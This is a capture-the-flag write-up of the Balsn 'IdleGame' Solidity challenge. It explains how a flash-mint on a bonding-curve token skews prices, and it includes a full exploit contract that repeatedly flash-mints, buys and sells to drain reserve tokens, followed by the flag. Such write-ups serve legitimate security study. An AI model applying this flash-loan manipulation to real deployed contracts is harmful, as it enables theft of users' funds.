IdleGame
============
857 points - 4 Solves


I first started by performing source code review on `Tokens.sol`. It implements multiple contract definitions such as `ERC20` , `FlashERC20`, and `ContinuousToken`. 

The interesting part here is `ContinuousToken`, which are tokens that are managed by bonding curve contracts. In short, the prices of such token are calculated continously. Few properties of that are tokens can be minted limitlessly, the buy and sell prices of tokens are dependent on the token minted, and has instant liquidity. 

The `ContinuousToken` creates an object for Bancor Bonding Curve as shown as the line below

```solidity
BancorBondingCurve public constant BBC = BancorBondingCurve(0xF88212805fE6e37181DE56440CF350817FF87130);
```
 
The contract for BancorBondingCurve is deployed on ropsten on address `0xF88212805fE6e37181DE56440CF350817FF87130`. Next thing, I did was to pull off the source code of the uploaded contract file from the ropsten chain. BancorBondingCurve is a mathematical curve which defines the relationship between price and token supply. So, if the number of minted tokens increase, then the price of the token also increases (and vice versa). The BancorBondingCurve contract is essentially formula which manages the price of a `ContinousToken`. The formula is:

```
Reserve Ratio = Reserve Token Balance / (Continuous Token Supply x Continuous Token Price)
```

At this point, I audited the Bancor contract to see if there is an intentional vulnerability being placed in how the mathematical expressions were happening but nothing stood out. I also diffed the said deployed contract with an original BancorBondingCurve (used in multiple real projects) to see if there are any anomalies. But, It was fine. Hence, it was evident that, I should audit the codebase more to see how this ContinuousToken is being used.


Looking at `IdleGame.sol` , I could see that 

```solidity
    function giveMeMoney() public {                                         // It can provide us 1 BSN
        require(balanceOf(msg.sender) == 0, "BalsnToken: you're too greedy");
        _mint(msg.sender, 1);
```

This means that, if the caller contract to the deployed BSN token contract has no BSN coin, then they are gifted 1 BSN coin. But, you cannot mint as much as BSN coins as you want - Which is a catch here. 

The challenge deploys Setup contract which does the following operations

```solidity
 
    constructor() public {
        uint initialValue = 15000000 * (10 ** 18);                   
        BSN = new BalsnToken(initialValue);                          // // 15,000,000 BSN Cap
        IDL = new IdleGame(address(BSN), 999000);                   // ReserveRatio is 999000
        BSN.approve(address(IDL), uint(-1));                        // BSN can be used to mint IDL tokens
                                                                    //uint(-1) is infinity allowance
        IDL.buyGamePoints(initialValue);
    }
```

As I mentioned in the comments, The Market Token Cap (Minted) for BSN coins is 15,000,000 BSN Coins. The BSN Tokens can be used to mint IDL Tokens with an infinity allowance. We will come back to `buyGamePoints` once we analyze IDL contract. The constructor of IdleGame Contract is as follow

```solidity
constructor (address BSNAddr, uint32 reserveRatio) public ContinuousToken(reserveRatio) ERC20("IdleGame", "IDL") {
        owner = msg.sender;                                     // Deployer is the owner of the token
        BSN = BalsnToken(BSNAddr);                              // IDL can be purchased using BSN
        _mint(msg.sender, 0x9453 * scale);                      // 37971 IDL Tokens
    }
```

Once the IdleGame contract is deployed, it mints `37971` IDL Tokens. Now, we analyze member functions of the contract.

```solidity
function buyGamePoints(uint amount) public returns (uint) {
        uint bought = _continuousMint(amount);                          // How much IDL will I get from BSN
        BSN.transferFrom(msg.sender, address(this), amount);            // BSN coins can be converted to IDL 
        _mint(msg.sender, bought);                                      // You will get IDL
        return bought;
    }
    
    function sellGamePoints(uint amount) public returns (uint) {        // Accepts Amount in IDL 
        uint bought = _continuousBurn(amount);
        _burn(msg.sender, amount);
        BSN.transfer(msg.sender, bought);
        return bought;
    }

```
Following are the parameters for the Bancor. 
Reserve Ratio = 999000 & Reserve Token Balance = 10 ** 15. Note that BSN is used as a reserve token to purchase IDL token. This looked very familiar to me, because there is also a use of `FlashERC20` which is a Flash Token. I instantly thought about Eminence Attack, in which DAI was used as a reserve for EMN token, and EMN token was used as a reserve for eAAVE token. However, it is not exactly similar because we don't have 3 tokens playing there part. 

```solidity
contract IdleGame is FlashERC20, ContinuousToken
```

`IdleGame` inherits from `FlashERC20` which is

```solidity

interface IBorrower {
    function executeOnFlashMint(uint amount) external;
}

contract FlashERC20 is ERC20 {
    event FlashMint(address to, uint amount);

    function flashMint(uint amount) external {
        _mint(msg.sender, amount);
        IBorrower(msg.sender).executeOnFlashMint(amount);
        _burn(msg.sender, amount);
        emit FlashMint(msg.sender, amount);
    }
}
```

Flash loans are a recent blockchain smart contract construct that enable the issuance of loans that are only valid within one transaction and must be repaid by the end of that transaction. 

There is a good explaination of how this library work: https://docs.google.com/presentation/d/1E3Uuoj4DYEWGWpV2PzY1a8I86nCbgo52xL7xhNvNVj8/edit#slide=id.p

As per the documentation, we can issue as many IDL as we want throughout one atomic transaction until we return it back by the end of the `flashMint` call. That being said, we can write our own logic on the caller contract using `executeOnFlashMint` function. 

Hence, we can perform a Flash Loan Attack to manipulate the price in the market. As coins are burned and not reserved, this opens a market loophole to perform this attack. The way we can walk out with profit is that we buy as much as possible IDL tokens (calculated by ContinuousMint) using our gifted 1 BSN token after taking an enormous amount of IDL flash loan which can cause a rift (pump) in IDL price. The rift in IDL price happens because the Bancor Curve will temporarily messed up by getting a huge IDL mint (pump). This means that after we withdraw the converted IDL coins from the deposited 1 BSN Token in our first call to `buyGamePoints` , we can end the flash loan by repaying the same huge amount loan back. That will cause the burn of the falsely inflated minted coins prior. Once, the flash loan calls finishes, the return via `sellGamePoints` will yeild more BSN tokens for the previously purchased IDL tokens.

A visual attack looks as following

```
giveMoney() will send pow(10,-18) BSN coins
FlashERC20 Mint
buyGamePoints() with pow(10, -18) BSN coins 
FlashERC20 Burn 
sellGamePoints() and you will receive BSN coins a bit more 
FlashERC20 Mint
buyGamePoints() with all the BSN coins
FlashERC20 Burn
sellGamePoints() and you will receive BSN coins a bit more 
FlashERC20 Mint
buyGamePoints() with all the BSN coins
FlashERC20 Burn
sellGamePoints() and you will receive BSN coins a bit more 
FlashERC20 Mint
buyGamePoints() with all the BSN coins
FlashERC20 Burn
giveMeFlag()
```

This interplay should be done all atomically in one transaction. I wrote an exploit code to perform it.

```solidity
contract Exploit {
 
    address IDLAddress = 0xAAAAAAA; // Enter IDL of your deployed contract
    address BSNAddress = 0xBBBBBBB; // Enter BSN of your deployed contract
    uint public count;
    uint myidl;
    uint boo;
 
    IdleGame idl = IdleGame(address(IDLAddress));
    BalsnToken bsn = BalsnToken(address(BSNAddress));
 
    function pwn() public {
      bsn.approve(IDLAddress, uint(-1));
      bsn.giveMeMoney();
      idl.flashMint(99056419041694676677800000000000000002);
      boo = idl.sellGamePoints(myidl);
      idl.flashMint(99056419041694676677800000000000000002);
      boo = idl.sellGamePoints(myidl);
      idl.flashMint(99056419041694676677800000000000000002);
      boo = idl.sellGamePoints(myidl);
      idl.flashMint(99056419041694676677800000000000000002);
      idl.giveMeFlag();
 
    }
 
    function executeOnFlashMint(uint amount) external {
        if (count == 0){
            myidl = idl.buyGamePoints(1);   // or 10^-18 like 0.000000000000000001
            count = count+1;
        }else if (count == 1){
            myidl = idl.buyGamePoints(boo);
            count = count+1;
        }else if (count ==2){
            myidl = idl.buyGamePoints(boo);
            count = count+1;
        }else if (count ==3){
            myidl = idl.buyGamePoints(boo);
            count = count+1;
        }
    }
 
 
}
```

The block for transaction for this attack: https://ropsten.etherscan.io/tx/0x129a5bffa0bf2a4bd5a956e919a509b8f9b55cabc3d6b10742326ad08650fdba

I then used the netcat service to get the flag once I noticed that tx was successful. All in all it was a really good challenge and always awesome to see Blockchain challenges in quality CTFs. Thanks to Balsn CTF authors. 

##### Flag: BALSN{Arb1tr4ge_wi7h_Fl45hMin7}
